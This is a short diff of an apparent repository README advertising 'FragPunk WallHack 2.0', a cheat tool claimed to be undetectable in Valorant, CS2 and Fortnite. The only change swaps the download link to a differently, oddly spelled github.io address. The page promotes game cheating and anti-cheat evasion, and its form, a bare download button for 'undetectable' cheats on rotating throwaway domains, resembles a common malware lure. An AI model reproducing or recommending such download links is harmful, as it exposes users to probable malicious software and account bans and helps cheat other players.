@@ -2,7 +2,7 @@
 
 FragPunk WallHack 2.0 is the ultimate gaming enhancement tool for competitive FPS players, offering advanced visibility features for titles like Valorant, CS2 and Fortnite with undetectable performance.
 
-[![Download FragPunk WallHack 2.0](https://img.shields.io/badge/Download-FragPunk_WallHack_2.0-blueviolet)](https://cs2-wallhack-undetected.github.io/.github/)
+[![Download FragPunk WallHack 2.0](https://img.shields.io/badge/Download-FragPunk_WallHack_2.0-blueviolet)](https://fragpank1wallh1ck1web.github.io/.github/)
 
 ---
 
